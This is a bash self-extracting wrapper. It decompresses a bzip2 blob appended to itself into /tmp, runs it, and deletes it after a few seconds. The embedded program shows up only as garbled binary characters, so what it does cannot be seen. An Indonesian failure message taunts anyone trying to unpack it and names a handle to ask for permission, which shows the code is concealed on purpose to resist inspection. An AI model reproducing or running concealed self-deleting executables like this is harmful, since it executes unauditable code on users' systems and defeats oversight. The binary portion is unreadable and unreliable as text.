#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�V�  b� }��vk�����@n��P�D4��S�O���Q�D�e=M&�S�zS�ަH�L�A�F�a4CF��&d`bba0�!�&�	�!�<����jd��  Q��<���>��/��T0���r/�B��׋S	:ظzcé�1Z�D�~]sS�W�8��uAŌ�FL7�k� &`�y��[��>���dh�O��������&��96�2��lR_�]1L�Ǿ��ː�Vӵ��;�V�Oq�4f� ��ۘUбgdX�Fu���#��m�?.p~�l\̷Ix&�Aټb�<�o���p�IG�L��ى��iq���$&��u@�)������ܖxw}u�Z��HR)�}�!J�؊cO�j,���VZu�Rz����i��aOpY�#M�V��U����}˔s_lm�����/1�^��2"�K�� 9Vǯ�&�������ͮV��BE�1)^iJ���A}��� �r�s�AÓR	5�
s����P�Y��,:��y�a3%�Un4�9CϺ����#�Ĥg�P�=�
Z���m��#M�Q�:�5P���u�����$I�F�nۮ��sYR�UaeÂ݁��+"ж&��CBWs�n�I�=ya`b�,�k�s���Y�"���9��lCj&N�Ð3�0��.�p�!���